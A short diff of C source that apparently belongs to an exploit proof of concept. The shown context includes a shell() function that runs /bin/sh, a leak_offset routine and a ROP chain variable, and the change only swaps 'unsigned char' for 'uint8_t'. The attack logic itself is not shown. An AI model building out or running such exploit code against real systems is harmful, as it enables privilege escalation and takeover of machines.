@@ -37,7 +37,7 @@ static void shell(void)
 	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
 }
 
-static void leak_offset(int fd, unsigned char *data)
+static void leak_offset(int fd, uint8_t *data)
 {
 	uintptr_t ptr;
 
@@ -49,7 +49,7 @@ static void leak_offset(int fd, unsigned char *data)
 
 int main(void)
 {
-	unsigned char data[0x500] = { 0 };
+	uint8_t data[0x500] = { 0 };
 	uintptr_t *rop_chain;
 	int fd;
 
